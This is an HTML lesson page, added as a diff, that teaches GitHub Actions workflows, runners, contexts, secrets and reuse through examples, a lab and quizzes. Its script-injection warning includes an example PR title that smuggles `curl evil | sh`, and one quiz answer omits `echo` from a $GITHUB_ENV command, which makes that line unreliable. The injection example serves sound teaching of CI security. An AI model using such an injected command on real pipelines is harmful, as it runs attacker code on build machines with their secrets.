@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C2 · GitHub Actions: Workflows, Jobs, Steps & Runners · K8s Notes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../css/style.css">
+<script src="../js/theme.js"></script>
+</head>
+<body data-page="c02" data-root="../" data-linux="l01,l02,l07,l10" data-related="d09,d28,d36,d43,c01">
+<article class="lesson">
+<p class="lead">GitHub Actions is CI that lives next to the code: a YAML file in <code>.github/workflows/</code> describes <em>when</em> to run, <em>what</em> to run, and <em>where</em>. Because it is the default for anything hosted on GitHub, it is the CI most Kubernetes teams meet first. This page takes the workflow file apart — events, jobs, steps, runners, contexts, secrets, matrices, caching, reuse — and then shows what a "runner" actually is at the Linux level, because that is where every confusing failure comes from.</p>
+
+<div class="objectives"><h4>What you'll learn</h4><ul>
+<li>Workflow → job → step: what each is, what runs where, what is parallel</li>
+<li>Events and filters: push, pull_request, workflow_dispatch, schedule</li>
+<li>Runners: GitHub-hosted VMs vs self-hosted, and what the runner process does</li>
+<li>Contexts and expressions: <code>${{ github.sha }}</code>, <code>secrets</code>, <code>needs</code>, <code>if:</code></li>
+<li>Passing data: env, <code>$GITHUB_ENV</code>, <code>$GITHUB_OUTPUT</code>, job outputs, artifacts, cache</li>
+<li>Matrix builds, service containers, concurrency, environments</li>
+<li>Reuse: reusable workflows and composite actions</li>
+</ul></div>
+
+<h2>The shape of a workflow</h2>
+<div class="flow"><span>event</span><i>triggers →</i><span>workflow (one YAML file)</span><i>contains →</i><span>jobs (parallel, each on its own runner)</span><i>contain →</i><span>steps (sequential, same runner)</span></div>
+<figure data-anim="gha-anatomy"></figure>
+<div class="yaml-anno">
+<pre><code class="lang-yaml"># .github/workflows/ci.yml
+name: ci
+on:
+  push:
+    branches: [main]
+    paths-ignore: ["docs/**"]
+  pull_request:
+  workflow_dispatch:
+    inputs:
+      env: { type: choice, options: [dev, staging], default: dev }
+permissions:
+  contents: read                  # least privilege for GITHUB_TOKEN
+env:
+  IMAGE: ghcr.io/${{ github.repository }}
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix: { node: [20, 22] }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: "${{ matrix.node }}", cache: npm }
+      - run: npm ci
+      - run: npm test -- --reporter junit --output test.xml
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: { name: junit-${{ matrix.node }}, path: test.xml }
+  build:
+    needs: [test]
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.meta.outputs.tag }}
+    steps:
+      - uses: actions/checkout@v4
+      - id: meta
+        run: echo "tag=${GITHUB_SHA::7}" &gt;&gt; "$GITHUB_OUTPUT"
+      - run: docker build -t "$IMAGE:${{ steps.meta.outputs.tag }}" .</code></pre>
+<ul class="notes">
+<li><b>on</b> — the events. <code>push</code>/<code>pull_request</code> with branch/path filters; <code>workflow_dispatch</code> adds a "Run workflow" button with typed inputs; <code>schedule</code> takes cron (UTC); <code>release</code>, <code>workflow_call</code> (reusable), <code>repository_dispatch</code> (API-triggered).</li>
+<li><b>permissions</b> — scopes of the automatic <code>GITHUB_TOKEN</code>. Default is read/write-everything on older repos; set it explicitly like a Role (<a href="../lessons/d36-rbac.html">Day 36</a>): <code>contents: read</code>, <code>packages: write</code>, <code>id-token: write</code>.</li>
+<li><b>env</b> — variables at workflow, job or step level; the innermost wins. Available as real environment variables inside <code>run:</code>.</li>
+<li><b>concurrency</b> — one run per group; <code>cancel-in-progress</code> kills the previous run on the same branch.</li>
+<li><b>jobs.*.runs-on</b> — which runner: a hosted label (<code>ubuntu-latest</code>, <code>ubuntu-24.04</code>) or self-hosted labels.</li>
+<li><b>strategy.matrix</b> — expands the job into one job per combination (here two). <code>fail-fast</code>, <code>max-parallel</code>, <code>include</code>/<code>exclude</code> tune it.</li>
+<li><b>steps</b> — <code>uses:</code> runs an action (a reusable unit from the marketplace or a repo, pinned with <code>@v4</code> or a SHA); <code>run:</code> runs a shell script. Steps share the runner's filesystem and run in order.</li>
+<li><b>needs</b> — job dependencies; the DAG. A job with <code>needs</code> waits for those jobs and is skipped if they fail.</li>
+<li><b>outputs</b> — strings a job exposes to jobs that <code>need</code> it, read as <code>${{ needs.build.outputs.tag }}</code>.</li>
+</ul>
+</div>
+<div class="callout connect" data-ref="d09"><p>This is a manifest in the <a href="../lessons/d09-yaml-imperative-declarative.html">Day 9</a> sense: declarative, in git, reviewed in PRs. But there is no reconcile loop — a workflow is a <em>program</em> that runs once per event. That distinction (event-driven script vs. continuously reconciled state) is exactly what separates CI from GitOps, and comes back in <a href="c06-gitops-principles.html">C6</a>.</p></div>
+
+<h2>What a runner really is</h2>
+<p>A runner is a machine with the <strong>GitHub Actions runner agent</strong> installed — a .NET program (<code>Runner.Listener</code>) that long-polls GitHub asking "any job for my labels?". When a job arrives, it forks a <code>Runner.Worker</code> that executes the steps one by one and streams logs back. That is all the magic there is.</p>
+<figure data-anim="gha-runner"></figure>
+<div class="grid-2">
+<div class="card"><h4>GitHub-hosted</h4><ul>
+<li>A <strong>fresh VM per job</strong> (Ubuntu/Windows/macOS), destroyed afterwards. Nothing survives between jobs except what you upload (artifacts, cache).</li>
+<li><code>ubuntu-latest</code>: 4 vCPU / 16 GB for public repos, a large preinstalled toolset (docker, kubectl, helm, node, python, gcloud/aws/az CLIs…).</li>
+<li>Runs as user <code>runner</code> with passwordless <code>sudo</code>; workspace at <code>/home/runner/work/&lt;repo&gt;/&lt;repo&gt;</code>.</li>
+<li>Free minutes for public repos; billed per minute for private (Linux cheapest).</li>
+</ul></div>
+<div class="card"><h4>Self-hosted</h4><ul>
+<li>You install the agent on your own VM/container/cluster and register it with labels (<code>runs-on: [self-hosted, linux, gpu]</code>).</li>
+<li>Persistent by default: the workspace and everything you installed <strong>stay</strong> between jobs — faster, but dirty state and leaked secrets are on you. Use <code>--ephemeral</code> (one job then exit) for hygiene.</li>
+<li>Needed for: access to private networks/clusters, special hardware, cost at scale. In Kubernetes, <em>actions-runner-controller</em> creates ephemeral runner Pods on demand (<a href="c03-github-actions-kubernetes.html">C3</a>).</li>
+<li>Never use self-hosted runners for public repos: a PR from anyone runs arbitrary code on your machine.</li>
+</ul></div>
+</div>
+<div class="callout linux" data-ref="l01,l02,l07,l10"><p>On a self-hosted Linux box the agent is a <strong>systemd service</strong> (<code>./svc.sh install</code> writes <code>actions.runner.*.service</code>; <code>journalctl -u actions.runner…</code> is where its logs go — <a href="../linux/l07-systemd-journald.html">L7</a>). Every <code>run:</code> step is written to a temp file and executed as <code>bash --noprofile --norc -eo pipefail /tmp/….sh</code> — a child process with the step's <code>env:</code> merged into its environment, whose exit status decides pass/fail (<a href="../linux/l01-processes-signals.html">L1</a>). A <code>container:</code> job is the same thing with the worker running the steps inside a Docker container (<a href="../linux/l02-namespaces.html">L2</a>). Cancelling a job sends <code>SIGINT</code> then <code>SIGTERM</code> to that process tree — which is why a step that ignores signals "hangs" until the 5-minute kill.</p></div>
+
+<h2>Contexts and expressions</h2>
+<p><code>${{ … }}</code> is evaluated by GitHub <em>before</em> the step runs; the result is substituted as text. Inside <code>run:</code> you can also just read the environment variables GitHub sets.</p>
+<div class="tbl-wrap"><table class="cmd-table">
+<thead><tr><th>Expression</th><th>Meaning</th><th>Same thing as an env var</th></tr></thead>
+<tbody>
+<tr><td>${{ github.sha }}</td><td>Commit being built (PRs: the merge commit)</td><td><code>$GITHUB_SHA</code></td></tr>
+<tr><td>${{ github.ref_name }}</td><td>Branch or tag name (<code>main</code>, <code>v1.2.0</code>)</td><td><code>$GITHUB_REF_NAME</code></td></tr>
+<tr><td>${{ github.event_name }}</td><td><code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>…</td><td><code>$GITHUB_EVENT_NAME</code></td></tr>
+<tr><td>${{ github.event.inputs.env }}</td><td>A <code>workflow_dispatch</code> input (also <code>inputs.env</code>)</td><td>the event JSON at <code>$GITHUB_EVENT_PATH</code></td></tr>
+<tr><td>${{ secrets.KUBECONFIG }}</td><td>A secret (repo / environment / org); masked in logs</td><td>only if you map it: <code>env: { KC: ${{ secrets.KUBECONFIG }} }</code></td></tr>
+<tr><td>${{ vars.CLUSTER }}</td><td>A non-secret configuration variable</td><td>same — map it</td></tr>
+<tr><td>${{ env.IMAGE }}</td><td>Workflow/job/step <code>env</code></td><td><code>$IMAGE</code></td></tr>
+<tr><td>${{ steps.meta.outputs.tag }}</td><td>Output of an earlier step (with <code>id:</code>)</td><td>—</td></tr>
+<tr><td>${{ needs.build.outputs.tag }}</td><td>Output of a job this job <code>needs</code></td><td>—</td></tr>
+<tr><td>${{ matrix.node }}</td><td>Current matrix value</td><td>—</td></tr>
+<tr><td>${{ runner.os }} / ${{ runner.temp }}</td><td>Runner facts</td><td><code>$RUNNER_OS</code>, <code>$RUNNER_TEMP</code></td></tr>
+</tbody></table></div>
+<pre><code class="lang-yaml">    steps:
+      - if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
+        run: echo "release build"
+      - if: failure()                      # only when an earlier step failed; also always(), success(), cancelled()
+        run: ./notify.sh
+      - if: contains(github.event.head_commit.message, '[skip e2e]') == false
+        run: make e2e
+      - run: echo "cache key ${{ hashFiles('**/package-lock.json') }}"</code></pre>
+<div class="callout danger"><p><strong>Script injection.</strong> <code>run: echo "${{ github.event.pull_request.title }}"</code> pastes untrusted text into a shell script <em>before</em> it runs — a PR titled <code>"; curl evil | sh; echo "</code> executes. Pass untrusted values through <code>env:</code> and reference the variable (<code>echo "$TITLE"</code>) so the shell sees data, not code. Same rule as SQL parameters.</p></div>
+
+<h2>Passing data around</h2>
+<dl class="kv">
+<dt>Between steps (same job)</dt><dd>The filesystem — steps share the workspace. For variables: <code>echo "TAG=abc" &gt;&gt; "$GITHUB_ENV"</code> makes <code>$TAG</code> exist in <em>later</em> steps; <code>echo "tag=abc" &gt;&gt; "$GITHUB_OUTPUT"</code> exposes <code>steps.&lt;id&gt;.outputs.tag</code>. Both are literally files the worker reads after each step.</dd>
+<dt>Between jobs</dt><dd>Nothing is shared — different VMs. Small strings: job <code>outputs</code>. Files: <code>actions/upload-artifact</code> → <code>actions/download-artifact</code> (stored on GitHub, retention configurable). Images: push to a registry.</dd>
+<dt>Between runs</dt><dd><code>actions/cache</code> keyed by a hash of lock files (<code>setup-node</code>/<code>setup-go</code> do this for you); Docker layer cache via buildx <code>cache-to: type=gha</code> (<a href="c03-github-actions-kubernetes.html">C3</a>). Cache is best-effort: a miss must still work.</dd>
+<dt>Into the job from outside</dt><dd>Secrets and variables (repo → environment → org precedence), <code>workflow_dispatch</code> inputs, the event payload.</dd>
+</dl>
+<div class="callout connect" data-ref="d28"><p>Secrets here behave like Kubernetes Secrets (<a href="../lessons/d28-configmaps-secrets.html">Day 28</a>) with the same caveat: encryption at rest and masking in logs do <em>not</em> stop a step from <code>curl</code>-ing the value somewhere. Treat every third-party action you <code>uses:</code> as code that can read the job's secrets, and pin it to a commit SHA rather than a movable tag — the same immutable-vs-mutable argument as image tags in <a href="c01-cicd-fundamentals.html">C1</a>.</p></div>
+
+<h2>Containers and service containers</h2>
+<pre><code class="lang-yaml">jobs:
+  integration:
+    runs-on: ubuntu-latest
+    container: { image: golang:1.23 }         # steps run INSIDE this container (workspace bind-mounted)
+    services:
+      postgres:
+        image: postgres:16
+        env: { POSTGRES_PASSWORD: test }
+        options: --health-cmd "pg_isready" --health-interval 5s --health-retries 10
+    steps:
+      - uses: actions/checkout@v4
+      - run: go test ./...
+        env: { DATABASE_URL: postgres://postgres:test@postgres:5432/postgres }   # reachable by service name</code></pre>
+<div class="callout linux" data-ref="l02,l05"><p>The runner puts the job container and every service on one Docker bridge network, so <code>postgres</code> resolves by name — the same veth + bridge + embedded DNS mechanism as Docker Compose (<a href="../lessons/d03-docker-flags-ports.html">Day 3</a>, <a href="../linux/l05-networking.html">L5</a>). Without <code>container:</code>, services are still started but you reach them on <code>localhost:&lt;mapped port&gt;</code> because your steps run on the host VM, outside that network namespace.</p></div>
+
+<h2>Environments, approvals and gates</h2>
+<p>An <strong>environment</strong> (Settings → Environments) is a named target such as <code>production</code> with its own secrets, protection rules (required reviewers, wait timer, branch restrictions) and deployment history. A job that declares <code>environment: production</code> pauses until the rules are satisfied — this is how you implement Continuous <em>Delivery</em> with a human decision.</p>
+<pre><code class="lang-yaml">  deploy-prod:
+    needs: [build]
+    runs-on: ubuntu-latest
+    environment: { name: production, url: https://shop.example.com }
+    steps:
+      - run: echo "deploying ${{ needs.build.outputs.tag }}"      # runs only after a reviewer approves</code></pre>
+
+<h2>Reuse: reusable workflows and composite actions</h2>
+<div class="compare">
+<div><h4>Reusable workflow</h4><p>A whole workflow with <code>on: workflow_call</code> (typed <code>inputs</code>, <code>secrets</code>, <code>outputs</code>), invoked as a <em>job</em>: <code>jobs.build.uses: acme/.github/.github/workflows/build.yml@main</code> with <code>with:</code> and <code>secrets: inherit</code>. Its jobs run on their own runners. Use for "the org's standard build-and-push pipeline".</p></div>
+<div><h4>Composite action</h4><p>A directory with <code>action.yml</code> (<code>runs: using: composite</code>) bundling several steps into one <code>uses:</code>. Runs inside the calling job on the same runner. Use for "set up our toolchain" or "log in to our registry". JavaScript and Docker-container actions are the other two kinds.</p></div>
+</div>
+<div class="callout connect" data-ref="d43"><p>Reusable workflows are to pipelines what a <a href="../lessons/d43-helm.html">Helm chart</a> is to manifests: one parameterised definition, many callers passing values. The same trade-off applies — a tag like <code>@main</code> means every caller changes when the template changes; pin to <code>@v2</code> or a SHA for stability.</p></div>
+
+<h2>Debugging a run</h2>
+<pre><code class="lang-bash">$ gh run list --workflow ci.yml --limit 5              # the gh CLI mirrors the UI
+$ gh run watch                                          # follow the latest run live
+$ gh run view 123456789 --log-failed                    # only the failing step's log
+$ gh workflow run ci.yml -f env=staging                 # trigger a workflow_dispatch
+$ gh secret set KUBECONFIG &lt; ~/.kube/ci-config           # set a secret from a file
+# Re-run with debug logging: set repo secret ACTIONS_STEP_DEBUG=true, or "Re-run jobs → Enable debug logging"
+# Poke the runner from a step:
+      - run: |
+          id; pwd; echo "$GITHUB_WORKSPACE"; env | grep -E '^(GITHUB|RUNNER)_' | sort
+          docker version --format '{{.Server.Version}}'; kubectl version --client</code></pre>
+<div class="callout tip"><p>Most "works on my machine, fails in Actions" cases are: a file path assumed relative to somewhere else (<code>cd</code> does not persist between steps — each <code>run:</code> starts in <code>$GITHUB_WORKSPACE</code>); a tool version difference (pin with <code>setup-*</code> actions); an env var set in one step and expected in the next without <code>$GITHUB_ENV</code>; or a non-zero exit from a command whose failure you never noticed locally because your shell was not <code>-e</code>.</p></div>
+
+<div class="lab"><h3>Hands-on lab (25 min) — a real workflow, watched from the CLI</h3>
+<ol class="steps">
+<li><strong>Create a repo and push the C1 lab app</strong> (or any small project). Install the <code>gh</code> CLI and <code>gh auth login</code>.</li>
+<li><strong>Add the workflow</strong> — save the first YAML on this page as <code>.github/workflows/ci.yml</code>, but replace the <code>npm</code> steps with <code>sh test.sh</code> and the docker build from C1. Commit and push.</li>
+<li><strong>Watch it</strong>: <code>gh run watch</code>. Open the run in the browser too; expand a step and compare the log with what you expect from the runner animation above.</li>
+<li><strong>Break a test</strong>, push, and confirm the <code>build</code> job shows as skipped, not failed — <code>needs</code> in action.</li>
+<li><strong>Pass data</strong>: add <code>echo "tag=${GITHUB_SHA::7}" &gt;&gt; "$GITHUB_OUTPUT"</code> in a step with <code>id: meta</code>, expose it as a job output, and print it from a second job with <code>needs</code>. Then try printing it from a job <em>without</em> <code>needs</code> and see the empty string.</li>
+<li><strong>Inspect the runner</strong>: add the "poke the runner" step. Note the user, the workspace path, and that <code>docker</code> works — you will need that in C3.</li>
+<li><strong>Add a matrix</strong> over two values and watch two jobs appear from one definition.</li>
+</ol></div>
+
+<details class="quiz"><summary>A step does <code>export TAG=abc</code> and the next step's <code>echo $TAG</code> prints nothing. Why?</summary><div><p>Each <code>run:</code> is a separate <code>bash</code> process; an <code>export</code> dies with it (<a href="../linux/l01-processes-signals.html">L1</a>: environment is inherited by children, never passed back to parents or siblings). Write <code>TAG=abc &gt;&gt; "$GITHUB_ENV"</code>; the worker reads that file and injects the variable into subsequent steps.</p></div></details>
+<details class="quiz"><summary>Two jobs, <code>build</code> and <code>deploy</code>, both <code>runs-on: ubuntu-latest</code>. <code>build</code> creates <code>dist/app.tar</code>; <code>deploy</code> can't find it. Fix?</summary><div><p>Different jobs run on different VMs. Either upload the file as an artifact in <code>build</code> and download it in <code>deploy</code> (<code>needs: [build]</code>), or push it to a registry/bucket, or merge the two jobs. For images, the registry <em>is</em> the artifact store.</p></div></details>
+
+<div class="takeaways"><h3>Key takeaways</h3><ul>
+<li>Workflow = file; job = unit of parallelism on its own runner; step = sequential command or action on that runner. <code>needs</code> builds the DAG.</li>
+<li>A runner is a normal process on a normal machine; hosted runners are fresh VMs per job, self-hosted ones persist unless ephemeral.</li>
+<li><code>${{ }}</code> is evaluated before the shell runs — never paste untrusted input into <code>run:</code>; route it through <code>env:</code>.</li>
+<li>Data crosses steps via files (<code>$GITHUB_ENV</code>, <code>$GITHUB_OUTPUT</code>), jobs via outputs/artifacts, runs via cache — nothing is shared implicitly.</li>
+<li>Set <code>permissions:</code> explicitly, pin actions to SHAs, use environments for approvals, reusable workflows for the org standard.</li>
+</ul></div>
+</article>
+
+<script src="../js/curriculum.js"></script>
+<script src="../js/anim.js"></script>
+<script src="../js/app.js"></script>
+<script>
+(function(){
+  const S = Anim.S;
+
+  /* ---------- gha-anatomy ---------- */
+  const job = (id, x, y, title, steps) => S.g(id,
+    `<rect class="nb" x="${x}" y="${y}" width="170" height="70" rx="8"/>
+     <text class="lb sm b" x="${x + 85}" y="${y + 16}">${title}</text>
+     ${steps.map((s, i) => `<rect id="${id}-s${i}" class="nb soft dim" x="${x + 8 + i * 52}" y="${y + 26}" width="48" height="34" rx="6"/><text class="lb xs" x="${x + 32 + i * 52}" y="${y + 47}" font-size="9">${s}</text>`).join('')}`);
+  let svg = S.box('ev', 15, 105, 96, 48, ['event', 'push → main'], { subfs: 9, subcls: 'mono muted', cls: 'warn' })
+    + S.box('wf', 140, 105, 110, 48, ['workflow', 'ci.yml'], { subfs: 9, subcls: 'mono muted' })
+    + S.zone('r1', 285, 15, 200, 95, 'runner 1 · fresh VM')
+    + job('j1', 300, 33, 'job: test', ['checkout', 'setup', 'npm test'])
+    + S.zone('r2', 285, 150, 200, 95, 'runner 2 · fresh VM')
+    + job('j2', 300, 168, 'job: lint', ['checkout', 'setup', 'lint'])
+    + S.zone('r3', 530, 82, 200, 95, 'runner 3 · fresh VM')
+    + job('j3', 545, 100, 'job: build  (needs)', ['checkout', 'build', 'push'])
+    + S.arrow('a0', 111, 129, 138, 129)
+    + S.arrow('a1', 250, 122, 298, 68, { d: 'M 250 122 L 270 122 L 270 68 L 298 68' })
+    + S.arrow('a2', 250, 136, 298, 203, { d: 'M 250 136 L 270 136 L 270 203 L 298 203' })
+    + S.arrow('a3', 470, 68, 543, 135, { d: 'M 470 68 L 505 68 L 505 135 L 543 135', cls: 'hid' })
+    + S.arrow('a4', 470, 203, 543, 135, { d: 'M 470 203 L 505 203 L 505 135', cls: 'hid' })
+    + S.text('lab', 505, 128, 'outputs only', { cls: 'xs muted', fs: 9 })
+    + S.text('m', 380, 272, '', { cls: 'sm b' });
+  const st = (q, id, i, cls) => q(`#${id}-s${i}`).set(cls);
+  Anim.define('gha-anatomy', { w: 760, h: 285, title: 'Event → workflow → jobs → steps', ms: 2300, svg, steps: [
+    { c: 'A push to <code>main</code> matches the workflow\'s <code>on:</code> filter. GitHub creates a <b>workflow run</b>.', on(q){ q('#ev rect').set('warn'); q('#a0').set('hl'); q('#wf rect').set('hl'); q('#m').text('on.push.branches: [main] ✓'); } },
+    { c: 'Jobs with no <code>needs</code> start immediately, <b>in parallel</b>, each on its own freshly provisioned runner VM.', on(q){ q('#a1,#a2').set('hl'); q('#r1 rect,#r2 rect').set('hl'); q('#m').text('test and lint: no needs → parallel'); } },
+    { c: 'Inside a job, steps run <b>one after another</b> on that runner: checkout clones the repo into the workspace…', on(q){ st(q, 'j1', 0, 'hl'); st(q, 'j2', 0, 'hl'); q('#m').text('step 1: actions/checkout@v4'); } },
+    { c: '…then setup installs a toolchain, then the <code>run:</code> step executes your script. Each step\'s exit code decides the next.', on(q){ st(q, 'j1', 0, 'ok'); st(q, 'j2', 0, 'ok'); st(q, 'j1', 1, 'ok'); st(q, 'j2', 1, 'ok'); st(q, 'j1', 2, 'hl'); st(q, 'j2', 2, 'hl'); q('#m').text('step 3: run: npm test'); } },
+    { c: 'Both jobs succeed. <code>build</code> declared <code>needs: [test, lint]</code>, so it waited; now it starts on a <b>third</b> VM. Nothing on runner 1\'s disk exists here — only job <b>outputs</b> and uploaded artifacts cross the gap.', on(q){ st(q, 'j1', 2, 'ok'); st(q, 'j2', 2, 'ok'); q('#j1 rect:first-child,#j2 rect:first-child').set('ok'); q('#a3,#a4').show().set('hl'); q('#r3 rect').set('hl'); st(q, 'j3', 0, 'hl'); q('#m').text('needs satisfied → build starts'); } },
+    { c: 'Rewind: had <code>lint</code> failed, <code>build</code> would be <b>skipped</b> (not failed) and the run marked failed. The runner VMs are destroyed either way.', on(q){ st(q, 'j2', 2, 'bad'); q('#j2 rect:first-child').set('bad'); q('#a4').set('bad'); q('#r3 rect').set('dim'); q('#j3 rect:first-child').set('dim'); st(q, 'j3', 0, 'dim'); q('#m').text('lint exit=1 → build skipped → run failed'); } },
+  ]});
+
+  /* ---------- gha-runner ---------- */
+  svg = S.box('gh', 15, 60, 130, 54, ['GitHub', 'job queue'], { subfs: 9, subcls: 'muted', cls: 'soft' })
+    + S.zone('vm', 180, 12, 525, 262, 'runner VM  ·  ubuntu-latest  (Linux)')
+    + S.box('lis', 195, 42, 160, 40, ['Runner.Listener', 'long-poll · systemd svc'], { fs: 11, subfs: 9, subcls: 'muted' })
+    + S.box('wrk', 195, 108, 160, 40, ['Runner.Worker', 'one per job'], { fs: 11, subfs: 9, subcls: 'muted', hidden: true })
+    + S.box('s1', 395, 42, 295, 34, ['node checkout/index.js → git clone'], { fs: 10, hidden: true })
+    + S.box('s2', 395, 88, 295, 34, ['bash -eo pipefail /tmp/step2.sh'], { fs: 10, hidden: true })
+    + S.box('s3', 395, 134, 295, 34, ['bash -eo pipefail /tmp/step3.sh'], { fs: 10, hidden: true })
+    + S.box('ws', 395, 200, 140, 44, ['$GITHUB_WORKSPACE', '/home/runner/work/…'], { fs: 10, subfs: 9, subcls: 'mono muted', cls: 'soft' })
+    + S.box('envf', 550, 200, 140, 44, ['$GITHUB_ENV', 'a plain file'], { fs: 10, subfs: 9, subcls: 'mono muted', cls: 'soft' })
+    + S.arrow('a0', 145, 80, 193, 62, { d: 'M 145 80 L 193 64', label: 'any jobs?', lx: 160, ly: 55 })
+    + S.arrow('a1', 275, 82, 275, 106, { cls: 'hid', label: 'fork', lx: 300, ly: 98 })
+    + S.arrow('a2', 355, 120, 393, 59, { d: 'M 355 120 L 375 120 L 375 59 L 393 59', cls: 'hid' })
+    + S.arrow('a3', 375, 105, 393, 105, { cls: 'hid' })
+    + S.arrow('a4', 375, 151, 393, 151, { d: 'M 355 128 L 375 128 L 375 151 L 393 151', cls: 'hid' })
+    + S.arrow('a5', 540, 76, 465, 198, { d: 'M 540 76 L 540 120 L 465 120 L 465 198', cls: 'hid dashed' })
+    + S.arrow('a6', 620, 122, 620, 198, { cls: 'hid dashed', label: 'echo TAG=… >>', lx: 660, ly: 165 })
+    + S.text('m', 440, 262, '', { cls: 'sm b' });
+  Anim.define('gha-runner', { w: 720, h: 285, title: 'The runner, as Linux sees it', ms: 2500, svg, steps: [
+    { c: 'The runner agent is an ordinary process. <code>Runner.Listener</code> sits in a loop asking GitHub for jobs matching its labels. On a self-hosted box it is a systemd unit; on hosted runners it is baked into the VM image.', on(q){ q('#a0').set('hl'); q('#lis rect').set('hl'); q('#m').text('$ systemctl status actions.runner.*'); } },
+    { c: 'A job is assigned. The listener <b>forks</b> a <code>Runner.Worker</code> and hands it the job definition (steps, env, secrets — already decrypted for this job).', on(q){ q('#wrk').show(); q('#a1').show().set('hl'); q('#wrk rect').set('hl'); q('#m').text('fork → Runner.Worker (pid 4211)'); } },
+    { c: 'Step 1 is <code>uses: actions/checkout@v4</code> — a JavaScript action. The worker runs <code>node</code> on it; the action runs <code>git clone</code> into the workspace directory.', on(q){ q('#s1').show(); q('#a2').show().set('hl'); q('#s1 rect').set('hl'); q('#a5').show(); q('#ws rect').set('hl'); q('#m').text('git clone … $GITHUB_WORKSPACE'); } },
+    { c: 'Step 2 is a <code>run:</code> block. The worker writes your script to a temp file and executes <code>bash -eo pipefail</code> on it, with the step\'s <code>env:</code> merged into the process environment. It waits for the exit status.', on(q){ q('#s1 rect').set('ok'); q('#s2').show(); q('#a3').show().set('hl'); q('#s2 rect').set('hl'); q('#m').text('child process · cwd=$GITHUB_WORKSPACE · exit 0'); } },
+    { c: 'The script does <code>echo "TAG=abc" &gt;&gt; "$GITHUB_ENV"</code>. That is only a file append. <b>After</b> the step exits, the worker reads the file and adds <code>TAG</code> to the environment it will give step 3. Same mechanism for <code>$GITHUB_OUTPUT</code> and <code>$GITHUB_PATH</code>.', on(q){ q('#a6').show().set('hl'); q('#envf rect').set('warn'); q('#m').text('worker parses $GITHUB_ENV between steps'); } },
+    { c: 'Step 3 runs with <code>TAG</code> set. Suppose it exits 1: the worker marks the step failed, skips the rest (unless <code>if: always()</code>), uploads logs, and reports. A hosted VM is then destroyed; a self-hosted workspace is left as-is unless the runner is ephemeral.', on(q){ q('#s2 rect').set('ok'); q('#s3').show(); q('#a4').show().set('hl'); q('#s3 rect').set('bad'); q('#m').text('exit=1 → job failed → VM destroyed'); } },
+  ]});
+})();
+</script>
+</body>
+</html>
